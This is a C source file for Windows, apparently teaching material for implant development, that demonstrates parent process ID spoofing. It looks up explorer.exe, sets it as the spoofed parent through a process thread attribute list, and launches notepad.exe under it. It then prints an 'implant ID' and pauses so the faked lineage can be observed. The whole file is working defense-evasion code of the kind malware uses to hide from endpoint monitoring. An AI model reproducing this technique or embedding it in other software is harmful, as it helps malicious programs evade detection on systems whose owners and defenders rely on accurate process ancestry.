#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>


DWORD GetPidByName(const char * pName) {
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) {
		while (Process32Next(snapshot, &pEntry) == TRUE) {
			if (_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}


//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(void) {  
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = 0;
	
	dwPid = GetPidByName("explorer.exe");
	if (dwPid == 0)
			dwPid = GetCurrentProcessId();

	// create fresh attributelist
	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

	// copy and spoof parent process ID
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	UpdateProcThreadAttribute(pAttributeList,
							0,
							PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
							&hParentProcess,
							sizeof(HANDLE),
							NULL,
							NULL);

	info.lpAttributeList = pAttributeList;
	
	// launch new process with different parent
	CreateProcessA(NULL,
					(LPSTR) "notepad.exe",
					NULL,
					NULL,
					FALSE,
					EXTENDED_STARTUPINFO_PRESENT,
					NULL,
					NULL,
					&info.StartupInfo,
					&processInfo);
	
	printf("implant ID: %d | explorer ID: %d | notepad ID: %d\n", GetCurrentProcessId(), dwPid, processInfo.dwProcessId);
	
	// Short delay to see the parent-child relationship
	Sleep(30000);

	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(hParentProcess);

	return 0;
}
